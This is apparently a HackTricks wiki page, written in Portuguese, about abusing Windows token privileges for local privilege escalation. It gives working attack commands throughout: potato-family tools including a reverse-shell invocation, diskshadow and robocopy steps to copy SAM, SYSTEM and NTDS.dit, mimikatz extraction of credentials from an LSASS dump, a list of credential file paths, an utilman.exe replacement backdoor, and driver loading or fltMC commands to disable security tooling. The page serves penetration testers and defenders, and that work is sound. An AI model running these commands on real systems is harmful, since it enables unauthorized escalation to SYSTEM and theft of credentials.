# Abusando de Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Se você **não sabe o que são Windows Access Tokens**, leia esta página antes de continuar:


{{#ref}}
access-tokens.md
{{#endref}}

**Talvez você consiga escalar privilégios abusando dos tokens que já possui**

### SeImpersonatePrivilege

Este privilégio, quando mantido por um processo, permite a personificação (mas não a criação) de qualquer token, desde que seja possível obter um handle para ele. Um token privilegiado pode ser adquirido de um serviço do Windows (DCOM) induzindo-o a realizar autenticação NTLM contra um exploit, permitindo posteriormente a execução de um processo com privilégios de SYSTEM.<sup>[[2]](#references)</sup> Esta vulnerabilidade pode ser explorada usando várias ferramentas, como [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (que requer que o winrm esteja desabilitado), [SweetPotato](https://github.com/CCob/SweetPotato) e [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Observações modernas para operadores:

- **JuicyPotato é legado**: no Windows 10 1809+/Server 2019+, prefira **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** ou **PrintSpoofer**, dependendo de qual superfície RPC/COM ainda está acessível.
- Se você comprometeu um serviço executado como **`LOCAL SERVICE`** ou **`NETWORK SERVICE`** e `whoami /priv` exibe um **filtered token** sem `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, recupere primeiro o **conjunto padrão de privilégios** da conta (por exemplo, com **FullPowers**) e tente novamente a família potato.<sup>[[3]](#references)</sup>
- Alguns forks mais recentes são mais convenientes para operadores do que as ferramentas originais. Por exemplo, o **SigmaPotato** adiciona execução por reflection/in-memory e compatibilidade com versões modernas do Windows, enquanto o **PrintNotifyPotato** abusa do serviço COM PrintNotify e costuma ser útil quando o caminho clássico do Spooler está desabilitado.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

É muito semelhante ao **SeImpersonatePrivilege**; ele usará o **mesmo método** para obter um token privilegiado.\
Então, esse privilégio permite **atribuir um token primário** a um processo novo/suspenso. Com o token de impersonation privilegiado, você pode derivar um token primário (DuplicateTokenEx).\
Com o token, você pode criar um **novo processo** com 'CreateProcessAsUser' ou criar um processo suspenso e **definir o token** (em geral, não é possível modificar o token primário de um processo em execução).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Se esse token estiver habilitado, você poderá usar **KERB_S4U_LOGON** para obter um **token de impersonation** para qualquer outro usuário sem conhecer as credenciais, **adicionar um grupo arbitrário** (admins) ao token, definir o **nível de integridade** do token como "**medium**" e atribuir esse token à **thread atual** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Por meio desse privilégio, o sistema concede controle de **acesso de leitura total** a qualquer arquivo (limitado a operações de leitura). Ele é utilizado para **ler os hashes de senha** das contas locais de **Administrator** no registry. Em seguida, ferramentas como "**psexec**" ou "**wmiexec**" podem ser usadas com o hash (técnica Pass-the-Hash). No entanto, essa técnica falha em duas condições: quando a conta Local Administrator está desabilitada ou quando existe uma policy que remove os direitos administrativos de Local Administrators que se conectam remotamente.<sup>[[2]](#references)</sup>\
Na prática, o workflow built-in mais confiável geralmente é **VSS + `robocopy /b`**: criar/expor uma shadow copy e, em seguida, copiar `SAM`/`SYSTEM` ou `NTDS.dit` em **backup mode**, contornando as ACLs dos arquivos.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Você pode **abusar desse privilégio** com:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- seguindo o **IppSec** em [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ou conforme explicado na seção **escalating privileges with Backup Operators** de:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Este privilégio fornece permissão de **write access** a qualquer arquivo do sistema, independentemente da Access Control List (ACL) do arquivo. Ele abre inúmeras possibilidades de escalation, incluindo a capacidade de **modificar services**, realizar DLL Hijacking e definir **debuggers** por meio de Image File Execution Options, entre várias outras técnicas.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege é uma permissão poderosa, especialmente útil quando um usuário possui a capacidade de impersonate tokens, mas também na ausência de SeImpersonatePrivilege. Essa capacidade depende da possibilidade de impersonate um token que represente o mesmo usuário e cujo integrity level não exceda o do processo atual.<sup>[[2]](#references)</sup>

**Pontos principais:**

- **Impersonation sem SeImpersonatePrivilege:** é possível aproveitar SeCreateTokenPrivilege para EoP fazendo impersonation de tokens sob condições específicas.
- **Condições para Token Impersonation:** uma impersonation bem-sucedida exige que o token-alvo pertença ao mesmo usuário e tenha um integrity level menor ou igual ao integrity level do processo que tenta realizar a impersonation.
- **Criação e Modificação de Impersonation Tokens:** os usuários podem criar um impersonation token e aprimorá-lo adicionando o SID (Security Identifier) de um grupo privilegiado.

### SeLoadDriverPrivilege

Este privilégio permite **carregar e descarregar device drivers** com a criação de uma entrada no registry com valores específicos para `ImagePath` e `Type`. Como o acesso direto de escrita a `HKLM` (HKEY_LOCAL_MACHINE) é restrito, `HKCU` (HKEY_CURRENT_USER) deve ser utilizado. No entanto, para tornar `HKCU` reconhecível pelo kernel para a configuração do driver, um caminho específico deve ser seguido.<sup>[[2]](#references)</sup>

O uso ofensivo moderno normalmente é **BYOVD** (bring your own vulnerable driver): carregar um kernel driver **assinado, mas vulnerável**, e então usar seus IOCTLs para desativar proteções ou obter code execution no kernel. Tenha em mente que, em builds recentes do Windows 11/Server, a **Microsoft vulnerable driver blocklist** e/ou **HVCI/Memory Integrity** frequentemente impedem chains públicas mais antigas; portanto, os exemplos clássicos no estilo `szkg64.sys` não são mais universalmente confiáveis.

Esse caminho é `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, onde `<RID>` é o Relative Identifier do usuário atual. Dentro de `HKCU`, todo esse caminho deve ser criado, e dois valores precisam ser definidos:<sup>[[2]](#references)</sup>

- `ImagePath`, que é o caminho para o binário a ser executado
- `Type`, com o valor `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Etapas a seguir:**

1. Acesse `HKCU` em vez de `HKLM` devido ao acesso de escrita restrito.
2. Crie o caminho `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` dentro de `HKCU`, onde `<RID>` representa o Relative Identifier do usuário atual.
3. Defina `ImagePath` como o caminho de execução do binário.
4. Atribua `Type` como `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Mais maneiras de abusar desse privilégio em [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Isso é semelhante a **SeRestorePrivilege**. Sua função principal permite que um processo **assuma a propriedade de um objeto**, contornando o requisito de acesso discricionário explícito por meio da concessão de direitos de acesso WRITE_OWNER. O processo envolve primeiro obter a propriedade da chave de registro pretendida para fins de escrita e, em seguida, alterar a DACL para habilitar operações de escrita.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Este privilégio permite **depurar outros processos**, inclusive ler e escrever na memória. Com esse privilégio, podem ser empregadas diversas estratégias de injeção de memória, capazes de evitar a maioria das soluções antivírus e de prevenção contra intrusões no host.<sup>[[2]](#references)</sup>

No Windows moderno, lembre-se de que `SeDebugPrivilege` geralmente é suficiente para abrir **processos SYSTEM não protegidos** e duplicar seus tokens, mas isso **não garante** que você possa acessar o **LSASS**. Se **RunAsPPL / LSA Protection** estiver habilitado, processos não protegidos não poderão ler nem injetar em LSASS, mesmo que `SeDebugPrivilege` esteja presente. Nesse caso, roube um token de outro processo SYSTEM não PPL ou encadeie com um bypass de PPL/BYOVD, em vez de presumir que o `procdump` funcionará. Para ver um exemplo completo de cópia de token usando `SeDebugPrivilege` + `SeImpersonatePrivilege`, consulte [esta página](sedebug-+-seimpersonate-copy-token.md).

#### Dump de memória

Você pode usar o [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) do [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) para **capturar a memória de um processo**. Especificamente, isso pode ser aplicado ao processo **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, responsável por armazenar as credenciais dos usuários depois que eles fazem login com sucesso em um sistema.

Em seguida, você pode carregar esse dump no mimikatz para obter as senhas:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Se você quiser obter um shell `NT SYSTEM`, poderá usar:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

This right (Perform volume maintenance tasks) permite abrir handles de dispositivos de volume raw (por exemplo, \\.\C:) para I/O direto em disco que ignora as ACLs do NTFS. Com ele, você pode copiar os bytes de qualquer arquivo no volume lendo os blocos subjacentes, possibilitando a leitura arbitrária de arquivos com material sensível (por exemplo, chaves privadas da máquina em %ProgramData%\Microsoft\Crypto\, hives do registro, SAM/NTDS via VSS).<sup>[[5]](#references)</sup> Ele é particularmente impactante em servidores de CA, nos quais a exfiltração da chave privada da CA permite forjar um Golden Certificate para personificar qualquer principal.<sup>[[6]](#references)</sup>

Consulte técnicas detalhadas e mitigações:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Verificar privilégios
```
whoami /priv
```
Os **tokens que aparecem como Disabled** geralmente podem ser habilitados, então muitas vezes você pode abusar dos privilégios _Enabled_ e _Disabled_.

### Habilitar todos os tokens

Se você tiver privilégios desabilitados, poderá usar o script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) para habilitar todos os tokens:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Ou o **script** incorporado neste [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Tabela

Cheatsheet completo dos privilégios de token em [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); o resumo abaixo lista apenas formas diretas de explorar o privilégio para obter uma sessão de admin ou ler arquivos sensíveis.<sup>[[1]](#references)</sup>

| Privilégio                  | Impacto      | Ferramenta                    | Caminho de execução                                                                                                                                                                                                                                                                                                                                     | Observações                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | ferramenta de terceiros          | _"Isso permitiria que um usuário personificasse tokens e fizesse privesc para o sistema NT usando ferramentas como potato.exe, rottenpotato.exe e juicypotato.exe"_                                                                                                                                                                                                      | Agradecimentos a [Aurélien Chalot](https://twitter.com/Defte_) pela atualização. Em breve tentarei reformular isso para algo mais parecido com uma receita.                                                                                                                                                                                         |
| **`SeBackup`**             | **Ameaça**  | _**Built-in commands**_ | Leia arquivos sensíveis com `robocopy /b` ou helpers de cópia dedicados compatíveis com SeBackup.                                                                                                                                                                                                                                                                 | <p>- Excelente para `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` e, às vezes, `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` é conveniente, mas cmdlets/APIs SeBackup dedicados geralmente são mais flexíveis para arquivos bloqueados/abertos.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | ferramenta de terceiros          | Crie um token arbitrário, incluindo direitos de admin local, com `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplique um token SYSTEM **não-PPL** ou extraia a memória de um processo não protegido.                                                                                                                                                                                                                                                                 | <p>A extração de LSASS geralmente é bloqueada quando RunAsPPL/LSA Protection está habilitado.</p><p>O script pode ser encontrado em [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | ferramenta de terceiros          | Use a **Potato family** / personificação via named pipe para iniciar o SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Mais prático em service accounts, como IIS APPPOOL, MSSQL, scheduled tasks ou qualquer contexto que já possua `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | ferramenta de terceiros          | <p>1. Carregue um kernel driver assinado, mas vulnerável (BYOVD)<br>2. Use os IOCTLs do driver para obter R/W no kernel, desabilitar ferramentas de segurança ou elevar para SYSTEM<br><br>Como alternativa, o privilégio pode ser usado para descarregar drivers relacionados à segurança com o comando builtin <code>fltMC</code>, por exemplo, <code>fltMC sysmondrv</code></p>                     | <p>Drivers públicos mais antigos, como <code>szkg64.sys</code>, são cada vez mais bloqueados no Windows moderno pela lista de bloqueio de drivers vulneráveis / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Inicie o PowerShell/ISE com o privilégio SeRestore presente.<br>2. Habilite o privilégio com <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Renomeie utilman.exe para utilman.old<br>4. Renomeie cmd.exe para utilman.exe<br>5. Bloqueie o console e pressione Win+U</p> | <p>O ataque pode ser detectado por alguns softwares AV.</p><p>Um método alternativo depende da substituição de service binaries armazenados em "Program Files" usando o mesmo privilégio</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Renomeie cmd.exe para utilman.exe<br>4. Bloqueie o console e pressione Win+U</p>                                                                                                                                       | <p>O ataque pode ser detectado por alguns softwares AV.</p><p>Um método alternativo depende da substituição de service binaries armazenados em "Program Files" usando o mesmo privilégio.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | ferramenta de terceiros          | <p>Manipule tokens para incluir direitos de admin local. Pode exigir SeImpersonate.</p><p>A verificar.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## Referências

- [1] [gtworek/Priv2Admin - exploitation paths from Windows privileges to admin](https://github.com/gtworek/Priv2Admin)
- [2] [Abusing Token Privileges For LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Give Me Back My Privileges! Please?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
